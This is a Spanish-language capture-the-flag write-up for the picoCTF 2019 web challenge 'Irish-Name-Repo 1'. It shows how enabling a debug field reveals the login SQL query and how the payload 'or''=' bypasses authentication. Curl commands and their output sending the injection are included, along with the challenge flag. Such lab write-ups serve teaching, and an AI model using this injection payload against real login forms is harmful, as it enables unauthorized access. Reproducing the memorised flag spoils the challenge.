# Irish-Name-Repo 1
#picoCTF2019 #WEB_EXPLOITATION 
## Objetivo 

There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Solución
Al entrar a la página nos encontramos con un repositorio de imágenes de personas irlandesas.
![[irisRepo1_1.png]]
Investigando un poco encontramos un link a una página de support en la cual se nos menciona algo sobre un error de tipo _SQL_. En base a eso podemos deducir que este sitio almacena su información en una base de datos de tipo SQL.
Navegando entre la pagina nos encontramos con un formulario para loguearse como el administrador del sitio.
![[irishRepo1_2.png]]
Si usamos el inspector de código podemos encontrar una variable denominada _debug_ con un valor igual a 0. Al estar en 0 e intentar un logueo fallido no nos arrojara los errores que se presenten durante este proceso.
Sin embargo al habilitar dicho _debug_ (dándole un valor de 1)e intentar un logueo fallido encontramos lo siguiente...
![[irisNameRepo1_3.png]]
Podemos observar que se trata de una consulta de tipo SQL en la que se buscan el nombre de usuario y la contraseña en la tabla _users_.
Añadiendo el siguiente texto en los campos de username y password _'or''='_ obtendríamos la siguiente consulta SQL.
SQL query: SELECT * FROM users WHERE name=' 'or''=' ' AND password=' 'or''=' '.
Considerando que la condición _'or''='_ siempre será verdadera nos debería devolver el registro que coincida con el usuario y contraseña del administrador y de este modo permitirnos el login.
![[irishNameRepo1_4.png]]
![[irisNameRepo1_4.png]]
Bandera ==**picoCTF{s0m3_SQL_f8adf3fb}**==

## Notas adicionales
Se puede hacer también mediante consola, usando comando curl. La consulta se hace mediante un post.
Mediante curl -d se hace una solicitud post.
```bash
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=pass&debug=1"
<pre>username: admin
password: pass
SQL query: SELECT * FROM users WHERE name='admin' AND password='pass'
</pre><h1>Login failed.</h1> 
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username='or''='';&password=pass&debug=1"
<pre>username: 'or''='';
password: pass
SQL query: SELECT * FROM users WHERE name=''or''='';' AND password='pass'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_f8adf3fb}</p> 
```
Aquí también se puede obtener la bandera, todo esto mediante consola.
Si no se incluye un "-d" se intuye que es un GET.
-X POST, -X GET, para ser más especifico.
## Referencias
https://www.w3schools.com/sql/sql_injection.asp